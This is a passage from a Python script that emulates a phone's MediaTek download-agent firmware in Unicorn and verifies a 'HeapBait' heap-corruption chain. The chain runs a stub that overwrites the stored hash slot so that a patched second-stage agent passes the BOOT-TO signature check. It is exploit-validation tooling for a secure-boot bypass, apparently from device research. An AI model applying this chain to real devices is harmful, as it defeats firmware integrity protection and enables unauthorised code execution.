    emu.budget["hits"] = 0
    benign_rc = emu.call(CMD_LOOP, [])
    benign_tx = [t for t in emu.tx]
    out["benign_rc"] = benign_rc & 0xFFFFFFFF
    out["benign_tx"] = [t.decode("latin-1") for t in benign_tx]
    out["assert_cmdloop"] = any(b"<command>CMD:END</command>" in t
                                and b"<result>OK</result>" in t for t in benign_tx)

    # ---- (iv) hash slot ---------------------------------------------------
    slot = bytes(emu.uc.mem_read(DST_ADDR, 32))
    out["hash_slot"] = slot.hex()
    out["hash_written"] = digest.hex()
    out["assert_slot"] = slot == digest

    # ---- (v) BOOT-TO gate, then DA1's own hash routine --------------------
    if not _mapped(emu, DA2_AT):
        emu.uc.mem_map(DA2_AT, 0x100000)
    if sha_model == "engine":
        install_sha_engine(emu)

    # real CMD:BOOT-TO handler: downloads `body` to 0x40000000, hashes it with
    # 0x2522C4, compares against 0x2688CC, returns 0 on match
    cmp_hits = {"count": 0, "mismatch": False, "ok_log": False}

    def on_cmp(uc, addr, size, ud):
        cmp_hits["count"] += 1

    def on_bad(uc, addr, size, ud):
        cmp_hits["mismatch"] = True

    def on_ok_log(uc, addr, size, ud):
        cmp_hits["ok_log"] = True

    emu.uc.hook_add(UC_HOOK_CODE, on_cmp, begin=BOOT_HASH_CMP, end=BOOT_HASH_CMP)
    emu.uc.hook_add(UC_HOOK_CODE, on_bad, begin=BOOT_HASH_BAD, end=BOOT_HASH_BAD)
    emu.uc.hook_add(UC_HOOK_CODE, on_ok_log, begin=BOOT_HASH_OK, end=BOOT_HASH_OK)

    emu.on_send = BootHost(emu, bytes(body)).on_send
    emu.rx.clear()
    emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
    emu.write_bytes(XML_ADDR, BOOT_XML)
    emu.tx.clear()
    emu.budget["hits"] = 0
    boot_rc = emu.call(BOOT_TO, [SESSION, XML_ADDR])
    boot_rc &= 0xFFFFFFFF
    boot_cb = u32(emu.uc, DPC_STRUCT + 4)
    boot_arg = u32(emu.uc, DPC_STRUCT + 8)
    staging = bytes(emu.uc.mem_read(DA2_AT, 32))
    out["boot_to"] = {"rc": boot_rc, "dpc_cb": boot_cb, "dpc_arg": boot_arg,
                      "staging_head": staging.hex(),
                      "cmp_bytes": cmp_hits["count"],
                      "mismatch_branch": cmp_hits["mismatch"],
                      "ok_log_emitted": cmp_hits["ok_log"]}
    gate_ok = (boot_rc == 0 and boot_cb == DA2_AT and boot_arg == 0x2DE180
               and not cmp_hits["mismatch"] and cmp_hits["count"] >= 32
               and staging == bytes(body[:32]))
    out["assert_bootto"] = gate_ok

    # direct call of DA1's 0x2522c4 over the bytes BOOT-TO just placed at
    # 0x40000000, then memcmp against the slot
    emu.write_bytes(SHA_OUT, b"\xAA" * 0x30)
    emu.write_bytes(SHA_OUTLEN, b"\xBB" * 4)
    emu.call(SHA_ROUTINE, [DA2_AT, DA2_BODY, SHA_OUT, SHA_OUTLEN])
    sha_out = bytes(emu.uc.mem_read(SHA_OUT, 32))
    sha_outlen = u32(emu.uc, SHA_OUTLEN)
    out["sha_routine"] = {"out": sha_out.hex(), "outlen": sha_outlen,
                          "model": sha_model, "input": hex(DA2_AT),
                          "input_len": DA2_BODY,
                          "equal_slot": sha_out == slot}
    out["assert_sha"] = bool(sha_out == slot and sha_outlen == 32)

    out["budget_hit_any"] = emu.budget["hit"]

    # ---- native SHA probe (informational) --------------------------------
    out["sha_native_probe"] = sha_native_probe(image, bytes(body[:0x400]))

    # ---- verdict ---------------------------------------------------------
    checks = {
        "fire": out["fire_ok"],
        "stub_return": out["stub_return_ok"],
        "stub_ran": out["assert_slot"],
        "freelist": out["assert_freelist"],
        "alloc": out["assert_alloc"],
        "cmdloop": out["assert_cmdloop"],
        "slot": out["assert_slot"],
        "sha_routine": out["assert_sha"],
        "bootto_gate": out["assert_bootto"],
    }
    out["checks"] = checks
    out["pass"] = all(checks.values())
    return out


def _mapped(emu, addr: int) -> bool:
    try:
        emu.uc.mem_read(addr, 4)
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------
def hexdump(blob: bytes, base: int, indent: str = "  ") -> list[str]:
    lines = []
    for i in range(0, len(blob), 16):
        chunk = blob[i:i + 16]
        text = "".join(chr(c) if 32 <= c < 127 else "." for c in chunk)
        lines.append(f"{indent}{base + i:08x}  {chunk.hex(' '):<47s}  |{text}|")
    return lines


def report(res: dict, quiet: bool = False) -> int:
    p = print

    def hx(value):
        return f"0x{value:x}" if isinstance(value, int) else "none"

    p("=" * 78)
    p("DA1 HeapBait -> blx -> hash-slot patch chain (Unicorn, offline)")
    p("=" * 78)
    p(f"image          : {res['image']}")
    p(f"DA2            : {res['da2']}")
    dp = res["da2_patch"]
    p(f"DA2 patch      : body[{dp['offset']:#x}] ^= {dp['xor']:#04x}  "
      f"(length preserved: {dp['length_preserved']}, body {dp['length']:#x} B)")
    p(f"  old digest   : {dp['old_digest']}")
    p(f"  new digest   : {dp['new_digest']}")
    p(f"  slot @0x2688CC before: {dp['slot_before']}")
    p(f"  slot == sha256(unpatched body): {dp['slot_matches_old']}")
    if res["sha_model"] == "engine":
        p("[DEV] SHA-256 engine modelled at 0x2522c4 (hardware crypto block: "
          "clock gate 0x1000108c / engine 0x10210a08, no software K table in the "
          "image); the BOOT-TO compare path itself runs as native DA1 code.")

    if res.get("double_tap"):
        p("")
        p("-- double-tap hypothesis (exact download first, overflow second) --")
        for probe in res["double_tap"]:
            t1, t2 = probe["taps"]
            p(f"  L={probe['L']:#06x} capacity would be {probe['capacity']:#x}  "
              f"tap1 rc={t1['rc']:#x} D1="
              f"{(hex(t1['D']) if t1['D'] else '-'):>10s}  "
              f"tap2 D2={(hex(t2['D']) if t2['D'] else '-'):>10s} "
              f"node={hx(t2['node_size'])} need={hx(t2['needed'])} "
              f"exact_fit={t2['exact_fit']} next={t2.get('next_class', '-')} "
              f"cb={hx(t2['dpc_cb'])}")
            p(f"        -> {'FIRE' if probe['fire'] else 'NO FIRE'}: "
              f"{probe['reason']}")
    if res.get("fatal"):
        p("")
        p(f"FATAL: {res['fatal']}")
        return 1

    ev = res["events"]
    p("")
    p(f"stub mode      : {res['stub_mode']}  (requested {res['stub_mode_requested']})")
    p(f"fire length    : L={res['fire_length']:#x}  capacity={res['capacity']:#x} "
      f"({'double-tap' if res['stub_mode'] == 'double' else 'single-tap'})")
    pred = (f"0x{res['predicted_buffer']:x}"
            if res["predicted_buffer"] else "none")
    act = (f"0x{res['download_buffer']:x}"
           if res["download_buffer"] else "none")
    p(f"download buffer: predicted={pred} actual={act}  "
      f"match={res['prediction_ok']}")
    if ev["free_list_before"]:
        p("free list before: " + ", ".join(
            f"{n['addr']:#x}/{n['size']:#x}"
            for n in ev["free_list_before"]["nodes"][:6]))
    fw = ev["fire_write"]
    if fw:
        p(f"fire write     : *(0x{fw['node']:x}+8) = {fw['value']:#x}  "
          f"(free() core @0x2043cc)")
    blx = res["blx"]
    if blx:
        p(f"blx @0x2040d4  : target={blx['target']:#x} r0={blx['r0']:#x} "
          f"r1={blx['r1']:#x} r2={blx['r2']:#x} r3={blx['r3']:#x} "
          f"sp={blx['sp']:#x} lr={blx['lr']:#x}")
    p(f"stub return    : reached 0x2040d8 x{ev['safe_cont_hits']} (bx lr) -> "
      f"{'PASS' if res['stub_return_ok'] else 'FAIL'}")
    p("")
    p(f"stub           : {res['stub']['size']} bytes (0x{res['stub']['size']:x}), "
      f"placed at D=0x{res['download_buffer']:x}"
      if res["download_buffer"] else "stub           : not placed")
    if not quiet:
        p("  hexdump:")
        for line in hexdump(bytes.fromhex(res["stub"]["hex"]),
                            res["download_buffer"] or 0):
            p(line)
        p("  capstone:")
        for line in res["stub"]["disasm"]:
            p("    " + line)

    if res.get("budget_hit") or res.get("budget_hit_any"):
        p("")
        p(f"NOTE: a step was aborted by the {LOOP_BUDGET}-hit loop budget -- a "
          f"corrupted free list sends the next malloc into a bogus node; the DA "
          f"would be dead on device too.")
    p("")
    p("-- assertions (proved by execution) --")
    p(f"(i)   free-list walk     : nodes={res['free_list_after']['count']} "
      f"sentinel={res['free_list_after']['sentinel_reached']} "
      f"forged_present={res['free_list_after']['forged_present']} "
      f"-> {'PASS' if res['assert_freelist'] else 'FAIL'}")
    p("      chain: " + " -> ".join(
        f"{n['addr']:#x}/{n['size']:#x}"
        for n in res["free_list_after"]["nodes"][:8]))
    p(f"(ii)  malloc(0x100)+free x3: "
      + ", ".join(f"{r['ptr']:#x}" for r in res["alloc_rounds"])
      + f" -> {'PASS' if res['assert_alloc'] else 'FAIL'}")
    p(f"(iii) cmd_loop serves 1 more command (CMD:SET-HOST-INFO): "
      f"rc={res['benign_rc']:#x} -> {'PASS' if res['assert_cmdloop'] else 'FAIL'}")
    for t in res["benign_tx"]:
        if "CMD:END" in t:
            txt = "".join(c if 32 <= ord(c) < 127 else "" for c in t)
            p(f"      {txt.split('<arg>')[-1][:120]}")
    p(f"(iv)  memory[0x2688cc:0x2688ec] == sha256(patched body): "
      f"{'PASS' if res['assert_slot'] else 'FAIL'}")
    p(f"      slot : {res['hash_slot']}")
    p(f"      want : {res['hash_written']}")
    sh = res["sha_routine"]
    p(f"(v)   DA1 0x2522c4 over 0x40000000 (len {DA2_BODY:#x}) -> outlen="
      f"{sh['outlen']} equal_slot={sh['equal_slot']} "
      f"-> {'PASS' if res['assert_sha'] else 'FAIL'}  [sha model: {sh['model']}]")
    bt = res["boot_to"]
    p(f"      BOOT-TO gate: rc={bt['rc']:#x} dpc->cb={bt['dpc_cb']:#x} "
      f"dpc->arg={bt['dpc_arg']:#x} compared={bt['cmp_bytes']}B "
      f"mismatch={bt['mismatch_branch']} ok_log={bt['ok_log_emitted']} "
      f"-> {'PASS' if res['assert_bootto'] else 'FAIL'}")
    nprobe = res["sha_native_probe"]
    p(f"      native 0x2522c4 (no engine model): status={nprobe['status']!r} "
      f"pc={nprobe['pc']:#x} matches_hashlib={nprobe['matches_hashlib']}")
    p(f"      {nprobe['note']}")

    p("")
    p("-- PASS block (machine checkable) --")
    p(f"FIRE dpc->cb={res['fire_cb']:#x}" if res["fire_cb"] is not None
      else "FIRE dpc->cb=none")
    p(f"BLX target={res['blx']['target']:#x}" if res["blx"]
      else "BLX target=none")
    p(f"STUB bytes={res['stub']['size']} placed=0x{res['download_buffer']:x}"
      if res["download_buffer"] else f"STUB bytes={res['stub']['size']} placed=none")
    p(f"FREELIST ok nodes={res['free_list_after']['count']}"
      if res["assert_freelist"] else "FREELIST FAIL")
    p("ALLOC ok" if res["assert_alloc"] else "ALLOC FAIL")
    p("CMDLOOP ok" if res["assert_cmdloop"] else "CMDLOOP FAIL")
    p(f"HASH written={res['hash_slot']}" if res["assert_slot"]
      else f"HASH MISMATCH={res['hash_slot']}")
    p("BOOT-TO gate PASS" if res["assert_bootto"] else "BOOT-TO gate FAIL")
    p(f"STUB_MAX_BYTES={res['capacity']:#x}")
    p("")
    p(res["verdict_line"] if "verdict_line" in res else
      ("RESULT: PASS" if res["pass"] else "RESULT: FAIL"))
    return 0 if res["pass"] else 1


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="DA1 HeapBait fire -> stub -> hash-slot patch chain")
    ap.add_argument("--image", default=os.path.join(
        _HERE, "rmx3630-da2", "da1_allinone.bin"))
    ap.add_argument("--da2", default=os.path.join(
        _HERE, "rmx3630-da2", "da2_oplus.bin"),
        help="DA2 container (body = first 0x56ec8 bytes)")
    ap.add_argument("--stub-mode", choices=("auto", "single", "double"),
                    default="auto")
    ap.add_argument("--fire-length", type=_hexint, default=0x3C,
                    help="declared download length for single-tap (default 0x3c)")
    ap.add_argument("--sha-model", choices=("engine", "none"), default="engine",
                    help="model the hardware SHA-256 block at 0x2522c4")
    ap.add_argument("--json", default=None, help="write full results as JSON")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args(argv)

    for path in (args.image, args.da2):
        if not os.path.isfile(path):
            ap.error(f"file not found: {path}")

    res = run_chain(args.image, args.da2, args.stub_mode, args.fire_length,
                    args.sha_model, verbose=False)
    if args.json:
        with open(args.json, "w") as f:
            json.dump(res, f, indent=1)
        print(f"json written: {args.json}")
    return report(res, quiet=args.quiet)


if __name__ == "__main__":
    sys.exit(main())
